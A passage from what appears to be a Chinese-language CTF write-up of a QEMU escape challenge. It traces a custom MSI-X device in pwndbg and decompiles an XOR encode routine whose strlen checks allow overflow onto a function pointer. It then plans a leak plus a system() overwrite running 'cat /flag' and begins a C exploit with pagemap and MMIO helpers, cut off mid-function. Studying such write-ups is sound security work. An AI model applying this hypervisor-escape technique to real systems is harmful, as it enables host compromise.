&#x27;nvme&#x27; */</span></span><br><span class="line">*RCX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x555556174a80</span> —▸ <span class="number">0x55555585de20</span> ◂— push   r14</span><br><span class="line">*RDI  <span class="number">0x555557195e50</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSI  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R8   <span class="number">0x555555b83a93</span> ◂— outsb  dx, byte ptr [rsi] <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R9   <span class="number">0x2000</span></span><br><span class="line">*R10  <span class="number">0x80</span></span><br><span class="line">*R11  <span class="number">0x7ffff7c2abe0</span> —▸ <span class="number">0x55555719edf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R12  <span class="number">0x555557198980</span> ◂— <span class="number">0x10000058458086</span></span><br><span class="line">*R13  <span class="number">0x555557195e50</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R14  <span class="number">0x555557196070</span> —▸ <span class="number">0x5555564d7060</span> —▸ <span class="number">0x5555564e4f10</span> ◂— <span class="number">0x555500787844</span> <span class="comment">/* &#x27;Dxx&#x27; */</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line">*RBP  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffde70</span> —▸ <span class="number">0x5555558f4920</span> ◂— push   r12</span><br><span class="line">*RIP  <span class="number">0x55555585e230</span> ◂— call   <span class="number">0x555555710390</span></span><br><span class="line">───────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x55555585e230</span>    call   <span class="number">0x555555710390</span> &lt;<span class="number">0x555555710390</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555585e235</span>    xor    esi, esi</span><br><span class="line">   <span class="number">0x55555585e237</span>    mov    rcx, r13</span><br><span class="line">   <span class="number">0x55555585e23a</span>    mov    edx, <span class="number">4</span></span><br><span class="line">   <span class="number">0x55555585e23f</span>    mov    rdi, rbp</span><br><span class="line">   <span class="number">0x55555585e242</span>    call   <span class="number">0x5555558f6bb0</span> &lt;<span class="number">0x5555558f6bb0</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下一次断点我们看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x1</span></span><br><span class="line"> RBX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line"> RCX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x55555626a920</span> —▸ <span class="number">0x5555558fa280</span> ◂— mov    eax, dword ptr [rdi + <span class="number">0x620</span>]</span><br><span class="line">*RDI  <span class="number">0x555557195b00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R8   <span class="number">0x555555bed204</span> ◂— insd   dword ptr [rdi], dx <span class="comment">/* &#x27;msix-table&#x27; */</span></span><br><span class="line">*R9   <span class="number">0x400</span></span><br><span class="line">*R10  <span class="number">0x40</span></span><br><span class="line"> R11  <span class="number">0x7ffff7c2abe0</span> —▸ <span class="number">0x55555719fcc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R12  <span class="number">0x0</span></span><br><span class="line">*R13  <span class="number">0x400</span></span><br><span class="line">*R14  <span class="number">0x3f</span></span><br><span class="line">*R15  <span class="number">0x4</span></span><br><span class="line">*RBP  <span class="number">0x555557195b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x5555558fae9d</span> ◂— mov    rdi, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line"> RIP  <span class="number">0x555555710390</span> ◂— push   r15</span><br><span class="line">──────────────────[ DISASM ]───────────────────────────────</span><br><span class="line"> ► <span class="number">0x555555710390</span>    push   r15</span><br><span class="line">   <span class="number">0x555555710392</span>    push   r14</span><br><span class="line">   <span class="number">0x555555710394</span>    mov    r15, r9</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看到这里的名称是<code>msix-table</code>看一下函数调用栈</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x0000555555710390</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00005555558fae9d</span> in ?? ()</span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00005555558fb053</span> in ?? ()</span><br><span class="line">#<span class="number">3</span>  <span class="number">0x000055555585e25d</span> in ?? ()</span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00005555558f8df5</span> in ?? ()</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00005555558700b2</span> in ?? ()</span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00005555559c4d67</span> in ?? ()</span><br><span class="line">#<span class="number">7</span>  <span class="number">0x00005555559c93bf</span> in ?? ()</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00005555559c6c95</span> in ?? ()</span><br><span class="line">#<span class="number">9</span>  <span class="number">0x00005555558160bf</span> in ?? ()</span><br><span class="line">#<span class="number">10</span> <span class="number">0x000055555581857f</span> in ?? ()</span><br><span class="line">#<span class="number">11</span> <span class="number">0x0000555555abde1a</span> in ?? ()</span><br><span class="line">#<span class="number">12</span> <span class="number">0x00005555556afee1</span> in ?? ()</span><br><span class="line">#<span class="number">13</span> <span class="number">0x00007ffff7a660b3</span> in ?? ()</span><br><span class="line">#<span class="number">14</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们发现了一个就在<code>relaize</code>函数中的调用也就是<code>0x000055555585e25d</code>，对应的就是<code>msix_init_exclusive_bar</code>函数。 那么在这里就进行了<code>msix</code>的内存空间的注册，我们看一下关键的<code>msix_init</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ret = msix_init(dev, nentries, &amp;dev-&gt;msix_exclusive_bar, bar_nr,</span></span><br><span class="line"><span class="comment">//                    0, &amp;dev-&gt;msix_exclusive_bar,</span></span><br><span class="line"><span class="comment">//                    bar_nr, bar_pba_offset,</span></span><br><span class="line"><span class="comment">//                    0, errp);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msix_init</span><span class="params">(<span class="keyword">struct</span> PCIDevice *dev, <span class="type">unsigned</span> <span class="type">short</span> nentries,</span></span><br><span class="line"><span class="params">              MemoryRegion *table_bar, <span class="type">uint8_t</span> table_bar_nr,</span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> table_offset, MemoryRegion *pba_bar,</span></span><br><span class="line"><span class="params">              <span class="type">uint8_t</span> pba_bar_nr, <span class="type">unsigned</span> pba_offset, <span class="type">uint8_t</span> cap_pos,</span></span><br><span class="line"><span class="params">              Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    msix_mask_all(dev, nentries);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;dev-&gt;msix_table_mmio, OBJECT(dev), &amp;msix_table_mmio_ops, dev,</span><br><span class="line">                          <span class="string">&quot;msix-table&quot;</span>, table_size);</span><br><span class="line">    memory_region_add_subregion(table_bar, table_offset, &amp;dev-&gt;msix_table_mmio);</span><br><span class="line">    memory_region_init_io(&amp;dev-&gt;msix_pba_mmio, OBJECT(dev), &amp;msix_pba_mmio_ops, dev,</span><br><span class="line">                          <span class="string">&quot;msix-pba&quot;</span>, pba_size);</span><br><span class="line">    memory_region_add_subregion(pba_bar, pba_offset, &amp;dev-&gt;msix_pba_mmio);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从上层函数<code>msix_init_exclusive_bar</code>函数中可以看到这里的<code>table_bar</code>和<code>pba_bar</code>是同一个数值。而<code>pba_offset</code>的值就是<code>bar_pba_offset</code>，这个值其实是<code>table_size</code>，也就是说其实<code>msix_table，msix_pba</code>操作的是同一个内存空间，只不过分为上下两个部分，这个和<code>usb</code>类似。即<code>0-table_size</code>的部分由<code>msix-table</code>负责，<code>table_size-table_size+pba_size</code>的部分则是<code>msix-pba</code>负责。</p>
<p>主要看一下这里的<code>msix-pba_mmio_ops/msix-table_mmio_ops</code>的操作。这里函数代码太长就不放出来了。</p>
<p><code>msix-table_mmio_read</code>函数调用了一个函数指针，该函数指针可以在<code>msix-table_mmio_write</code>中设置，调用的函数是一个<code>encode</code>函数，简单实现了一个异或的加密操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode(a1_498, a1_518, a1_598);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将<code>+0x498</code>起始的字符串作为<code>key</code>，<code>0x518</code>起始的字符串作为<code>input</code>，<code>encode</code>之后的字符串写入<code>+598</code>的位置。函数指针位于<code>0x618</code>处。</p>
<p><code>msix-table_mmio_write</code>除了设置函数指针之外还可以为<code>cmd</code>赋值，该值在整个<code>msix</code>中都有用到。</p>
<p><code>msix-pba_read</code>函数用清空<code>key,input</code>，并且可以读取<code>output</code>即加密之后的字符串。这里需要注意的是<code>read</code>函数调用的第二个参数即<code>addr</code>应该是不受<code>read</code>过程中的设置的字节大小影响的。即<code>uint8_t read</code>也可以将<code>addr</code>设置为两个字节。</p>
<p><code>msix-pba_write</code>函数用来设置<code>key,input</code>的值。</p>
<p>这里其实很明显了，如果我们将函数指针直接覆写为<code>system.plt</code>那么之后调用的时候参数我们全都可以进行控制。主要是怎么覆写这个指针。我们看一下<code>encode</code>的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">char</span> *key, <span class="type">char</span> *input, __int64 output)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input_len; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">int</span> tmp; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> key_len; <span class="comment">// er8  encode(a1_498, a1_518, a1_598);</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  __int64 index; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  tmp = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">if</span> ( tmp &amp;&amp; input_len )</span><br><span class="line">  &#123;</span><br><span class="line">    key_len = tmp;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != input_len; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      tmp = i;</span><br><span class="line">      index = i;</span><br><span class="line">      LOBYTE(tmp) = input[index] ^ key[tmp % key_len];</span><br><span class="line">      *(_BYTE *)(output + index) = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们看到是用<code>strlen</code>这个函数来判断<code>key,input</code>的长度的，但是这两个区域是连着的，因此这里可以造成一个溢出，也就是如果我们填充<code>input=0x80</code>，且<code>output</code>中存在数据，那么就会溢出写函数指针。同样的原理可以进行越界读（因为越界读判断的是<code>output</code>的长度，将<code>output</code>填满即可越界读）。</p>
<p>思路很明显了，通过越界读读取函数指针泄漏的到<code>qemu base</code>的值，进一步得到<code>system.plt</code>的值，然后设置<code>key=cat /flag</code>，覆写函数指针，触发<code>system</code>的调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* misx_mmio_mem;</span><br><span class="line"><span class="type">int64_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">virtuak_addr_to_physical_addr</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mem_map</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* dev, <span class="type">size_t</span> offset, <span class="type">size_t</span> size )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open( dev, O_RDWR | O_SYNC );</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* result = mmap( <span class="literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !result ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close( fd );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">misx_mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">misx_pba_mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span 